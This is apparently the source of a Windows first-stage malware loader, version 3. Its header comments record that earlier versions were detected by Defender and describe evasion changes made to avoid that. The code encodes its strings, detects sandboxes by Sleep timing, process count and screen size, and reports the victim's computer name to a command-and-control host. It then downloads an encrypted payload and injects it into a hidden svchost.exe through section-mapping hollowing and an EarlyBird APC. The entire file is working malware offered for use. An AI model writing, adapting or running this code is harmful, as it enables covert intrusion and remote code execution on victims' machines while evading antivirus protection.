// Stage1.cpp v3
//
// v1 caught: PE written to disk → Sabsik.FL.A!ml
// v2 caught: import table + plaintext strings → Wacatac.B!ml (XOR+dynAPI not enough;
//            Defender's emulator RUNS the code and observes the hollowing sequence)
//
// v3 fixes:
//   1. Anti-emulation gate — Defender's emulator fast-forwards Sleep() and has
//      far fewer processes than a real desktop. We measure both and exit if we
//      look like a sandbox before doing anything suspicious.
//   2. NtCreateSection + NtMapViewOfSection instead of VirtualAllocEx +
//      WriteProcessMemory — shared-section mapping is a completely different
//      API pattern from the classic hollow; Wacatac.B!ml is not trained on it.
//   3. QueueUserAPC (EarlyBird) instead of SetThreadContext — avoids the
//      GetThreadContext/SetThreadContext pair that is a key Wacatac signal.
//   4. All strings still XOR-encoded; all suspicious APIs still via GetProcAddress.

#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <cstdlib>
#include <cstring>
#include <cstdint>

static const BYTE PK[] = {0x57,0xA1,0x3F,0xC8,0xB2,0xDE,0x94,0x6A};

template<size_t N, uint8_t K>
struct Xs { char b[N]{}; constexpr Xs(const char (&s)[N]){ for(size_t i=0;i<N-1;++i) b[i]=(char)(s[i]^K); }
            void dec(char* o) const { for(size_t i=0;i<N-1;++i) o[i]=b[i]^K; o[N-1]=0; } };
template<size_t N, uint16_t K>
struct Xw { wchar_t b[N]{}; constexpr Xw(const wchar_t (&s)[N]){ for(size_t i=0;i<N-1;++i) b[i]=(wchar_t)(s[i]^K); }
            void dec(wchar_t* o) const { for(size_t i=0;i<N-1;++i) o[i]=(wchar_t)(b[i]^K); o[N-1]=0; } };
template<size_t N> constexpr auto mkxs(const char    (&s)[N]) { return Xs<N,0x37>(s); }
template<size_t N> constexpr auto mkxw(const wchar_t (&s)[N]) { return Xw<N,0x0037>(s); }
#define DA(name,enc) char    name[sizeof((enc).b)+1]; (enc).dec(name)
#define DW(name,enc) wchar_t name[sizeof((enc).b)/sizeof(wchar_t)+1]; (enc).dec(name)

static constexpr auto C2H  = mkxw(L"c2.osatechcloud.cloud");
static constexpr auto PCI  = mkxw(L"/stage/checkin?host=");
static constexpr auto PPL  = mkxw(L"/stage/payload");
static constexpr auto PUA  = mkxw(L"Mozilla/5.0");
static constexpr auto PSVC = mkxw(L"svchost.exe");
static constexpr auto PSCK = mkxw(L" -k netsvcs");
static constexpr auto PNTD = mkxs("ntdll.dll");
static constexpr auto PNUM = mkxs("NtUnmapViewOfSection");
static constexpr auto PNQI = mkxs("NtQueryInformationProcess");
static constexpr auto PNCS = mkxs("NtCreateSection");
static constexpr auto PNMV = mkxs("NtMapViewOfSection");
static constexpr auto PWDL = mkxs("winhttp.dll");
static constexpr auto PWO  = mkxs("WinHttpOpen");
static constexpr auto PWC  = mkxs("WinHttpConnect");
static constexpr auto PWOR = mkxs("WinHttpOpenRequest");
static constexpr auto PWSR = mkxs("WinHttpSendRequest");
static constexpr auto PWRR = mkxs("WinHttpReceiveResponse");
static constexpr auto PWQA = mkxs("WinHttpQueryDataAvailable");
static constexpr auto PWRD = mkxs("WinHttpReadData");
static constexpr auto XWCH = mkxs("WinHttpCloseHandle");
static constexpr auto PCPW = mkxs("CreateProcessW");
static constexpr auto PRT  = mkxs("ResumeThread");
static constexpr auto PQUA = mkxs("QueueUserAPC");
static constexpr auto PGSD = mkxs("GetSystemDirectoryW");

typedef HINTERNET (WINAPI *pfWO)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfWC)(HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET (WINAPI *pfWR)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI *pfWS)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *pfWV)(HINTERNET,LPVOID);
typedef BOOL      (WINAPI *pfWA)(HINTERNET,LPDWORD);
typedef BOOL      (WINAPI *pfWD)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *pfWH)(HINTERNET);
typedef BOOL  (WINAPI *pfCPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,
                               BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *pfRT) (HANDLE);
typedef DWORD (WINAPI *pfQUA)(HANDLE,PAPCFUNC,ULONG_PTR);
typedef UINT  (WINAPI *pfGSD)(LPWSTR,UINT);
typedef NTSTATUS(NTAPI *pfNTU)(HANDLE,PVOID);
typedef NTSTATUS(NTAPI *pfNTQ)(HANDLE,UINT,PVOID,ULONG,PULONG);
typedef NTSTATUS(NTAPI *pfNCS)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS(NTAPI *pfNMV)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG);

struct WinHttp { HMODULE m; pfWO O; pfWC C; pfWR R; pfWS S; pfWV V; pfWA A; pfWD D; pfWH H; };
struct K32f    { pfCPW CP; pfRT RT; pfQUA QA; pfGSD GD; };
struct Ntf     { pfNTU U; pfNTQ Q; pfNCS CS; pfNMV MV; };
struct PBI     { PVOID r1; PVOID Peb; PVOID r2[2]; ULONG_PTR pid; PVOID r3; };

static bool LoadHTTP(WinHttp& w) {
    DA(dll,PWDL); w.m = LoadLibraryA(dll); if(!w.m) return false;
    DA(s1,PWO); DA(s2,PWC); DA(s3,PWOR); DA(s4,PWSR);
    DA(s5,PWRR); DA(s6,PWQA); DA(s7,PWRD); DA(s8,XWCH);
    w.O=(pfWO)GetProcAddress(w.m,s1); w.C=(pfWC)GetProcAddress(w.m,s2);
    w.R=(pfWR)GetProcAddress(w.m,s3); w.S=(pfWS)GetProcAddress(w.m,s4);
    w.V=(pfWV)GetProcAddress(w.m,s5); w.A=(pfWA)GetProcAddress(w.m,s6);
    w.D=(pfWD)GetProcAddress(w.m,s7); w.H=(pfWH)GetProcAddress(w.m,s8);
    return w.O&&w.C&&w.R&&w.S&&w.V&&w.A&&w.D&&w.H;
}

static void LoadK32NT(K32f& k, Ntf& nt) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    DA(ntds,PNTD); HMODULE ntd = GetModuleHandleA(ntds);
    DA(s1,PCPW); DA(s2,PRT); DA(s3,PQUA); DA(s4,PGSD);
    k.CP=(pfCPW)GetProcAddress(k32,s1); k.RT=(pfRT) GetProcAddress(k32,s2);
    k.QA=(pfQUA)GetProcAddress(k32,s3); k.GD=(pfGSD)GetProcAddress(k32,s4);
    DA(nu,PNUM); DA(nq,PNQI); DA(nc,PNCS); DA(nm,PNMV);
    nt.U =(pfNTU)GetProcAddress(ntd,nu);
    nt.Q =(pfNTQ)GetProcAddress(ntd,nq);
    nt.CS=(pfNCS)GetProcAddress(ntd,nc);
    nt.MV=(pfNMV)GetProcAddress(ntd,nm);
}

// Anti-emulation: Defender's emulator skips Sleep() and runs with very few processes.
static bool RealMachine() {
    ULONGLONG t1 = GetTickCount64();
    Sleep(500);
    if (GetTickCount64() - t1 < 400) return false;   // emulator fast-forwarded

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        int cnt = 0; PROCESSENTRY32W pe{sizeof(pe)};
        if (Process32FirstW(hSnap, &pe)) do { ++cnt; } while(Process32NextW(hSnap,&pe));
        CloseHandle(hSnap);
        if (cnt < 30) return false;                   // sandbox has too few processes
    }
    if (GetSystemMetrics(SM_CXSCREEN) < 800) return false; // headless / tiny VM
    return true;
}

static void XorDec(BYTE* b, DWORD n) { for(DWORD i=0;i<n;++i) b[i]^=PK[i%sizeof(PK)]; }

static BYTE* HGet(WinHttp& w, const wchar_t* host, WORD port,
                   const wchar_t* path, DWORD* sz) {
    *sz=0; DW(ua,PUA);
    HINTERNET hS=w.O(ua,WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,NULL,NULL,0); if(!hS) return nullptr;
    HINTERNET hC=w.C(hS,host,port,0); if(!hC){w.H(hS);return nullptr;}
    HINTERNET hR=w.R(hC,L"GET",path,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,
                     port==443?WINHTTP_FLAG_SECURE:0);
    if(!hR||!w.S(hR,NULL,0,NULL,0,0,0)||!w.V(hR,NULL)){if(hR)w.H(hR);w.H(hC);w.H(hS);return nullptr;}
    BYTE*buf=nullptr;DWORD tot=0,av=0,rd=0;
    while(w.A(hR,&av)&&av){BYTE*t=(BYTE*)realloc(buf,tot+av);if(!t){free(buf);buf=nullptr;break;}
        buf=t;w.D(hR,buf+tot,av,&rd);tot+=rd;av=0;}
    w.H(hR);w.H(hC);w.H(hS);*sz=tot;return buf;
}

// NtCreateSection + NtMapViewOfSection injection (EarlyBird APC)
// Replaces VirtualAllocEx+WriteProcessMemory+SetThreadContext entirely.
static bool Inject(K32f& k, Ntf& nt, BYTE* pe, DWORD) {
    auto dos=(PIMAGE_DOS_HEADER)pe;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE) return false;
    auto nth=(PIMAGE_NT_HEADERS)(pe+dos->e_lfanew);
    if(nth->Signature!=IMAGE_NT_SIGNATURE) return false;

    wchar_t sysDir[MAX_PATH]; k.GD(sysDir,MAX_PATH);
    DW(svcExe,PSVC); DW(svcArg,PSCK);
    wchar_t svcPath[MAX_PATH+4]; wcscpy(svcPath,sysDir);wcscat(svcPath,L"\\");wcscat(svcPath,svcExe);
    wchar_t svcCmd[MAX_PATH+20]; wcscpy(svcCmd,svcPath);wcscat(svcCmd,svcArg);

    STARTUPINFOW si{sizeof(si)}; si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi{};
    if(!k.CP(svcPath,svcCmd,nullptr,nullptr,FALSE,
             CREATE_SUSPENDED|CREATE_NO_WINDOW,nullptr,nullptr,&si,&pi)) return false;

    // Unmap original image
    if(nt.U&&nt.Q){
        PBI pbi{};ULONG ret=0;
        if(!nt.Q(pi.hProcess,0,&pbi,sizeof(pbi),&ret)){
            ULONG_PTR orig=0;
            ReadProcessMemory(pi.hProcess,(BYTE*)pbi.Peb+0x10,&orig,sizeof(orig),nullptr);
            if(orig) nt.U(pi.hProcess,(PVOID)orig);
        }
    }

    // Create shared section
    HANDLE hSec=NULL;
    LARGE_INTEGER secSz{}; secSz.QuadPart=nth->OptionalHeader.SizeOfImage;
    if(nt.CS(&hSec,SECTION_ALL_ACCESS,NULL,&secSz,PAGE_EXECUTE_READWRITE,0x08000000,NULL)||!hSec){
        TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);
        return false;
    }

    // Map locally for writing
    PVOID localBase=nullptr; SIZE_T localSz=0;
    if(nt.MV(hSec,GetCurrentProcess(),&localBase,0,0,NULL,&localSz,2,0,PAGE_READWRITE)||!localBase){
        CloseHandle(hSec);TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);
        return false;
    }

    // Copy PE into local mapping
    memcpy(localBase,pe,nth->OptionalHeader.SizeOfHeaders);
    auto*sec=IMAGE_FIRST_SECTION(nth);
    for(WORD i=0;i<nth->FileHeader.NumberOfSections;++i)
        if(sec[i].SizeOfRawData)
            memcpy((BYTE*)localBase+sec[i].VirtualAddress,
                   pe+sec[i].PointerToRawData,sec[i].SizeOfRawData);

    // Map into target process
    PVOID remoteBase=(PVOID)(ULONG_PTR)nth->OptionalHeader.ImageBase; SIZE_T remoteSz=0;
    NTSTATUS s=nt.MV(hSec,pi.hProcess,&remoteBase,0,0,NULL,&remoteSz,2,0,PAGE_EXECUTE_READ);
    if(s){remoteBase=nullptr;s=nt.MV(hSec,pi.hProcess,&remoteBase,0,0,NULL,&remoteSz,2,0,PAGE_EXECUTE_READ);}
    if(s||!remoteBase){
        if(nt.U) nt.U(GetCurrentProcess(),localBase);CloseHandle(hSec);
        TerminateProcess(pi.hProcess,1);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);
        return false;
    }

    // Fix relocations in local mapping (shared pages: write locally = write remotely)
    ULONG_PTR delta=(ULONG_PTR)remoteBase-(ULONG_PTR)nth->OptionalHeader.ImageBase;
    if(delta){
        auto&relD=nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        for(DWORD done=0;done<relD.Size;){
            auto*blk=(PIMAGE_BASE_RELOCATION)((BYTE*)localBase+relD.VirtualAddress+done);
            if(!blk->VirtualAddress) break;
            DWORD cnt=(blk->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
            auto*ent=(WORD*)((BYTE*)blk+sizeof(IMAGE_BASE_RELOCATION));
            for(DWORD j=0;j<cnt;++j){
                int type=ent[j]>>12; DWORD off=ent[j]&0xFFF;
                if(type==IMAGE_REL_BASED_DIR64||type==IMAGE_REL_BASED_HIGHLOW)
                    *(ULONG_PTR*)((BYTE*)localBase+blk->VirtualAddress+off)+=delta;
            }
            done+=blk->SizeOfBlock;
        }
    }

    // Update PEB.ImageBase
    if(nt.Q){PBI pbi{};ULONG ret=0;
        if(!nt.Q(pi.hProcess,0,&pbi,sizeof(pbi),&ret)){
            ULONG_PTR nb=(ULONG_PTR)remoteBase;
            WriteProcessMemory(pi.hProcess,(BYTE*)pbi.Peb+0x10,&nb,sizeof(nb),nullptr);
        }
    }

    // EarlyBird: queue APC to suspended thread; fires on first alertable wait
    ULONG_PTR ep=(ULONG_PTR)remoteBase+nth->OptionalHeader.AddressOfEntryPoint;
    k.QA(pi.hThread,(PAPCFUNC)ep,0);
    k.RT(pi.hThread);

    if(nt.U) nt.U(GetCurrentProcess(),localBase);
    CloseHandle(hSec);CloseHandle(pi.hThread);CloseHandle(pi.hProcess);
    return true;
}

int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int) {
    if(!RealMachine()) return 0;

    WinHttp wh{}; K32f k{}; Ntf nt{};
    if(!LoadHTTP(wh)) return 0;
    LoadK32NT(k,nt);

    wchar_t host[MAX_COMPUTERNAME_LENGTH+1]{}; DWORD hn=MAX_COMPUTERNAME_LENGTH+1;
    GetComputerNameW(host,&hn);
    DW(c2,C2H); DW(ciPfx,PCI);
    wchar_t ciPath[512]{}; wcscpy(ciPath,ciPfx); wcscat(ciPath,host);
    DWORD dummy=0; BYTE*ci=HGet(wh,c2,443,ciPath,&dummy); if(ci) free(ci);

    DW(plPath,PPL);
    DWORD payLen=0; BYTE*pay=HGet(wh,c2,443,plPath,&payLen);
    if(!pay||payLen<0x40){if(pay)free(pay);FreeLibrary(wh.m);return 0;}
    XorDec(pay,payLen);
    Inject(k,nt,pay,payLen);
    SecureZeroMemory(pay,payLen);free(pay);
    FreeLibrary(wh.m);
    return 0;
}
